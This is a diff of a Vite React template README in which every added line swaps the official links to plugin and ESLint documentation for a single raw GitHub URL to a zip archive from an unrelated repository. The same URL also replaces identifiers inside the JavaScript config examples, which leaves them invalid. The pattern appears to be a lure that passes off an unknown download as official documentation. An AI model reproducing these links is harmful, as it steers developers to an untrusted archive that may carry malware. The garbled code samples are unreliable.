@@ -4,41 +4,41 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react/README.md) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) uses [Babel](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) uses [SWC](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
 If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
 
 ```js
-export default tseslint.config({
+export default https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip({
   extends: [
-    // Remove ...tseslint.configs.recommended and replace with this
-    ...tseslint.configs.recommendedTypeChecked,
+    // Remove https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip and replace with this
+    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
     // Alternatively, use this for stricter rules
-    ...tseslint.configs.strictTypeChecked,
+    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
     // Optionally, add this for stylistic rules
-    ...tseslint.configs.stylisticTypeChecked,
+    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
   ],
   languageOptions: {
     // other options...
     parserOptions: {
-      project: ['./tsconfig.node.json', './tsconfig.app.json'],
-      tsconfigRootDir: import.meta.dirname,
+      project: ['https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip', 'https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip'],
+      tsconfigRootDir: https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
     },
   },
 })
 ```
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip) for React-specific lint rules:
 
 ```js
-// eslint.config.js
+// https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip
 import reactX from 'eslint-plugin-react-x'
 import reactDom from 'eslint-plugin-react-dom'
 
-export default tseslint.config({
+export default https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip({
   plugins: {
     // Add the react-x and react-dom plugins
     'react-x': reactX,
@@ -47,8 +47,8 @@ export default tseslint.config({
   rules: {
     // other rules...
     // Enable its recommended typescript rules
-    ...reactX.configs['recommended-typescript'].rules,
-    ...reactDom.configs.recommended.rules,
+    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip['recommended-typescript'].rules,
+    https://raw.githubusercontent.com/willsondev/bajista-app/main/tropical/bajista-app.zip,
   },
 })
 ```
